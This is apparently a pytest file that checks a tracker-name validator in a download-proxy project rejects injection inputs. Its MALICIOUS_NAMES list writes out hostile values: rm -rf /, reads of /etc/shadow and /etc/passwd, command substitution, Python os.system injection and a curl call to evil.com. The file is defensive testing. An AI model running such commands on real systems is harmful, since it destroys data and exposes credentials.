import os
import re
import sys
from typing import ClassVar

import pytest

_src = os.path.join(os.path.dirname(__file__), "..", "..", "download-proxy", "src")
if _src not in sys.path:
    sys.path.insert(0, _src)

_VALID_TRACKER_RE = re.compile(r"^[a-zA-Z0-9_-]+$")


def _validate_tracker_name(name: str) -> str:
    from merge_service.search import validate_tracker_name

    return validate_tracker_name(name)


class TestTrackerNameInjection:
    MALICIOUS_NAMES: ClassVar[list[str]] = [
        "; rm -rf /",
        "$(whoami)",
        "`curl evil.com`",
        "'; import os; os.system('id'); #",
        "test\nimport os",
        "../../../etc/passwd",
        "rutracker'; import os; os.system('echo pwned');'",
        "__import__('os').system('id')",
        "test && cat /etc/shadow",
        "foo|bar",
        "test$(echo pwned)",
        "tracker`id`",
        "x;y",
        "a b",
        "test\tinject",
    ]

    @pytest.mark.parametrize("name", MALICIOUS_NAMES)
    def test_malicious_tracker_name_rejected(self, name):
        with pytest.raises(ValueError):
            _validate_tracker_name(name)

    @pytest.mark.parametrize(
        "valid_name",
        ["rutracker", "kinozal", "nnmclub", "iptorrents", "my-tracker", "tracker_01", "ABC123"],
    )
    def test_valid_tracker_names_accepted(self, valid_name):
        assert _validate_tracker_name(valid_name) == valid_name

    def test_empty_name_rejected(self):
        with pytest.raises(ValueError):
            _validate_tracker_name("")

    def test_none_rejected(self):
        with pytest.raises((ValueError, TypeError)):
            _validate_tracker_name(None)  # type: ignore[arg-type]
